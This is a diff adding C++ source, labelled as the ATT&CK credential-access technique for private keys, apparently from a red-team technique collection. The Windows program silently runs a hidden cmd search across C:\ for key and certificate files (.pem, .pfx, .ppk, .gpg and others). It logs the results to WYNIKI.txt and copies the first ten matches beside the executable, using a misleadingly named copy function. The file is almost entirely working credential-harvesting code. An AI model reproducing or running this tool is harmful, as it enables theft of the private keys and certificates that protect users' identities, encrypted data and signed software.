@@ -1,0 +1,114 @@
+---
+title: "T1552.004.Private Keys"
+folder: "08. Credential Access"
+---
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <vector>
+#include <string>
+#include <algorithm>
+
+
+std::string GetExeDirectory() {
+    char buffer[MAX_PATH];
+    GetModuleFileNameA(NULL, buffer, MAX_PATH);
+    std::string::size_type pos = std::string(buffer).find_last_of("\\/");
+    return std::string(buffer).substr(0, pos);
+}
+
+
+void removeNewlines(std::string& str) {
+    str.erase(std::remove(str.begin(), str.end(), '\n'), str.end());
+}
+void BrowserCookieGetEmailChrome(std::string& sourcePath) {
+
+    size_t lastBackslashIndex = sourcePath.find_last_of("\\");
+    if (lastBackslashIndex == std::string::npos) {
+    }
+    std::string fileName = sourcePath.substr(lastBackslashIndex + 1);
+    removeNewlines(fileName);
+    removeNewlines(sourcePath);
+    fileName.erase(fileName.size() - 1);
+    sourcePath.erase(sourcePath.size() - 1);
+   
+    char buffer[MAX_PATH];
+    GetModuleFileNameA(NULL, buffer, MAX_PATH);
+    std::string currentLocation(buffer);
+    std::string destinationPath = currentLocation.substr(0, currentLocation.find_last_of("\\") + 1) + fileName;
+
+    std::ifstream sourceFile(sourcePath, std::ios::binary);
+    if (!sourceFile.is_open()) { return; }
+
+    std::ofstream destinationFile(destinationPath, std::ios::binary);
+    if (!destinationFile.is_open()) { return; }
+
+    destinationFile << sourceFile.rdbuf();
+    sourceFile.close();
+    destinationFile.close();
+}
+void RunSystemInfoInBackground() {
+    std::ifstream  outputFile("WYNIKI.txt");
+    if (!outputFile.is_open()) {
+        const char* command = "cmd /c dir /s /b /A:-D C:\\*.key C:\\*.pgp C:\\*.gpg C:\\*.ppk C:\\*.p12 C:\\*.pem C:\\*.pfx C:\\*.cer C:\\*.p7b C:\\*.asc";
+        std::ofstream  outputFile("WYNIKI.txt");
+        SECURITY_ATTRIBUTES saAttr;
+        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+        saAttr.bInheritHandle = TRUE;
+        saAttr.lpSecurityDescriptor = NULL;
+
+        HANDLE hReadPipe, hWritePipe;
+        if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) { outputFile.close(); return; }
+
+        STARTUPINFOA si = {};
+        si.cb = sizeof(STARTUPINFOA);
+        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        si.hStdError = hWritePipe;
+        si.hStdOutput = hWritePipe;
+
+        PROCESS_INFORMATION pi;
+
+        if (!CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { outputFile.close(); return; }
+
+        CloseHandle(hWritePipe);
+
+        const int BUFFER_SIZE = 4096;
+        char buffer[BUFFER_SIZE];
+        DWORD bytesRead;
+
+        while (ReadFile(hReadPipe, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
+            outputFile.write(buffer, bytesRead);
+        }
+
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        outputFile.close();
+    }
+    std::ifstream  outputFilea("WYNIKI.txt");
+    if (!outputFilea.is_open()) {
+        std::cerr << "Nie można otworzyć pliku: " << std::endl;
+        return;
+    }
+    std::string destass = GetExeDirectory();
+    std::string line;
+    int lineCount = 0;
+    while (std::getline(outputFilea, line) && lineCount < 10) {
+        BrowserCookieGetEmailChrome(line);
+        ++lineCount;
+    }
+
+    outputFilea.close();
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    RunSystemInfoInBackground();
+
+    return 0;
+}
